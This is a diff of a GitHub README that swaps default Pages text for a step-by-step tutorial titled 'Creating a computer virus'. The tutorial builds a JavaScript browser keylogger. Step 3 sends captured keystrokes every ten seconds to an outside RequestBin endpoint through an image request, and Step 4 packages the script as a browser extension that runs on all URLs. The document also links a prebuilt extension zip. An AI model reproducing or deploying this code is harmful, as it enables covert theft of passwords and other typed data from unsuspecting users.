@@ -1,37 +1,100 @@
-## Welcome to GitHub Pages
+# Creating a computer virus 
 
-You can use the [editor on GitHub](https://github.com/EXTREMOPHILARUM/virus/edit/main/README.md) to maintain and preview the content for your website in Markdown files.
+Welcome to creating a simple virus 
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+## Step 1
 
-### Markdown
+Lets print
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+```
+var keys = '';
+document.onkeypress = function (e) {
+    get = window.event ? event : e;
+    key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    keys += key;
+}
+window.setInterval(function () {
+    if (keys.length > 0){
+        console.log(keys);
+    }
+    keys = '';
+}, 10000);
 ```
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+## Step 2
 
-### Jekyll Themes
+Lets do something fun
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/EXTREMOPHILARUM/virus/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+```
+var keys = '';
+document.onkeypress = function (e) {
+    get = window.event ? event : e;
+    key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    keys += key;
+}
+window.setInterval(function () {
+    if (keys.length > 0){
+        alert(keys);
+    }
+    keys = '';
+}, 10000);
+```
 
-### Support or Contact
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+## Step 3
+
+Lets take things to the next level
+
+- Open [Request bin](https://requestbin.net/)
+
+- Click **Create a RequestBin** 
+
+
+```
+var keys = '';
+document.onkeypress = function (e) {
+    get = window.event ? event : e;
+    key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    keys += key;
+}
+window.setInterval(function () {
+    if (keys.length > 0){
+        new Image().src = 'http://{request bin url}?keys=' + keys;
+    }
+    keys = '';
+}, 10000);
+```
+
+
+## Step 4
+
+Lets make it even more cooler
+
+/content.js 
+```
+{
+  "manifest_version": 2,
+  "name": "Keylogger",
+  "version": "0.1",
+
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": ["content.js"]
+    }
+  ]
+}
+```
+
+<details>
+  <summary>Click here if you dont want to work hard</summary>
+  
+  Download [zip](https://github.com/EXTREMOPHILARUM/virus/releases/download/0.1/extension.zip)
+  
+</details>
